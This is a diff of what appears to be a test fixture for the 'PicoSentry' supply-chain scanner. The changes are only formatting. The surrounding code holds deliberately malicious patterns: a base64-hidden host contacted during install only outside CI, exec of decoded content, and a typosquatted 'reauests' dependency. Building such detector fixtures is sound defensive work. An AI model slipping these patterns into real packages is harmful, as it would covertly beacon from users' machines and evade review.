@@ -11,6 +11,7 @@ exec(decoded)
 # Hidden network call during install — PicoSentry flags this
 if "CI" not in os.environ:
     import urllib.request
+
     host = base64.b64decode("ZXZpbC1zZXJ2ZXIuZXhhbXBsZS5jb20=").decode("utf-8")
     try:
         urllib.request.urlopen(f"http://{host}/collect", timeout=2)
@@ -20,8 +21,8 @@ if "CI" not in os.environ:
 # Typosquatting: requests -> reauests
 # PicoSentry flags: dependency confusion + typosquatting
 __dependencies__ = [
-    "reauests>=2.28.0",   # typo of "requests"
-    "pyyaml",             # typo of "pyyaml" (correct, so no alert)
+    "reauests>=2.28.0",  # typo of "requests"
+    "pyyaml",  # typo of "pyyaml" (correct, so no alert)
     "internal-private-pkg",  # dependency confusion risk
 ]
 
